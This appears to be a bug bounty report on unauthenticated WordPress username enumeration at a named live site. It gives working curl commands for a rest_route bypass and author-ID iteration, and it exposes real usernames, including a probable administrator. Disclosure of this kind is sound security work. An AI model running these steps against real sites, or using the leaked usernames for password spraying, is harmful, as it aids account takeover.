# Submission #1 (ELAN Limited) — Unauthenticated WordPress Username Enumeration via REST Route Bypass

Target: https://www.elanlimited.com/blogs/ (in-scope host www.elanlimited.com)
Severity claimed: **P5 · Informational** (honest assessment; usernames only, no account access demonstrated)
Date: 2026-10-08
Reporter: prasanthselvaraj1511_e024ae04

> Field-by-field paste order below: Description → Steps → Impact → Recommendation → Submit or hold.

---

## Description

The WordPress installation hosted at https://www.elanlimited.com/blogs/ discloses registered usernames to unauthenticated visitors through two independent techniques:

1. **REST API route-parameter bypass.** Direct access to the REST API users endpoint (`/blogs/wp-json/wp/v2/users`) returns 404, indicating an attempt to block REST user enumeration. However, requesting the same endpoint through the `index.php?rest_route=` query parameter bypasses this block entirely and returns the full user list as JSON.
2. **Author archive ID iteration.** Requesting `/blogs/?author=<ID>` issues a 301 redirect to `/blogs/author/<username>/`, disclosing the login slug for each user ID.

This exposes the blog usernames **`sandeep`** (ID 1, likely an administrator account) and **`ravi-elan`** (ID 3, display name "Elan Group") to anyone on the internet. Additionally, `/blogs/readme.html` is accessible (200), disclosing the WordPress version.

CWE: CWE-200 (Exposure of Sensitive Information) / CWE-203 (Observable Discrepancy bypass).
OWASP: A01:2021 – Broken Access Control (information exposure).

## Steps to Reproduce

No authentication or special tooling is required — plain `curl` works.

**Step 1 — Confirm the REST users endpoint is blocked (control):**
```
curl -s -o /dev/null -w '%{http_code}\n' "https://www.elanlimited.com/blogs/wp-json/wp/v2/users"
```
Result: `404`

**Step 2 — Bypass the block via the rest_route parameter:**
```
curl -s "https://www.elanlimited.com/blogs/index.php?rest_route=/wp/v2/users&per_page=100"
```
Result: `200` with a JSON array containing user objects, e.g.:
- `{"id": 1, "slug": "sandeep", "name": "sandeep", ...}`
- `{"id": 3, "slug": "ravi-elan", "name": "Elan Group", ...}`

Each object also includes gravatar profile URLs for the accounts.

**Step 3 — Confirm the same usernames leak via author archive iteration:**
```
curl -s -o /dev/null -w '%{http_code} -> %{redirect_url}\n' "https://www.elanlimited.com/blogs/?author=1"
curl -s -o /dev/null -w '%{http_code} -> %{redirect_url}\n' "https://www.elanlimited.com/blogs/?author=3"
```
Result:
- `301 -> https://www.elanlimited.com/blogs/author/sandeep/`
- `301 -> https://www.elanlimited.com/blogs/author/ravi-elan/`

**Step 4 — (Optional) WordPress version disclosure:**
```
curl -s -o /dev/null -w '%{http_code}\n' "https://www.elanlimited.com/blogs/readme.html"
```
Result: `200`

Note: xmlrpc.php already returns 403 — good hardening; only the two vectors above remain open.

## Impact

An attacker can enumerate valid WordPress usernames without authentication. Combined with the publicly accessible login form (`/blogs/wp-login.php`), these usernames enable targeted credential-stuffing and password-spraying campaigns. Because user ID 1 (`sandeep`) is very likely the site administrator, a successful compromise would grant full control of the blog (content injection, malicious redirects, stored XSS affecting visitors of www.elanlimited.com).

The severity is submitted as P5/Informational because only usernames are exposed — no account access, user data, or content was viewed or modified. The `rest_route` bypass is also notable because it defeats an existing defensive control (the 404 on `/wp-json/`), so the mitigation in place is currently ineffective.

## Recommendation

1. Keep the REST users list blocked **for the bypass path as well**: the `index.php?rest_route=` query form must be covered by the same rule (block/neutralize `rest_route=.*wp/v2/users` for unauthenticated requests, or filter the REST users endpoint server-side).
2. Disable public author archives (`/author/<slug>/`) or rewrite author URLs to non-identifying display names (e.g., via a mu-plugin removing `?author=` redirect behaviour).
3. Ensure each author's **public display name** differs from their **login slug** (currently they match), so any residual disclosure is useless for login.
4. Restrict `/blogs/readme.html` (404 or empty) to avoid version disclosure.
5. General: enforce strong passwords + 2FA on wp-login.php, and rate-limit login attempts.

---

## Verified evidence (recon session, 2026-10-08)

All four steps above were executed and captured with curl during this session; HTTP codes and redirect targets match exactly what is written. No authenticated requests, no POSTs to the target, no accounts created.

## Submit or hold

**Recommendation: SUBMIT as P5** — clear, reproducible, read-only PoC; demonstrates that an existing control (wp-json 404) is bypassable. Risk of duplicate: moderate-high (user enumeration is a common classic), but the *bypass* framing + author-iteration combo is the strongest angle. If rejected as duplicate, hold further P5s on this program and pursue deeper targets only.
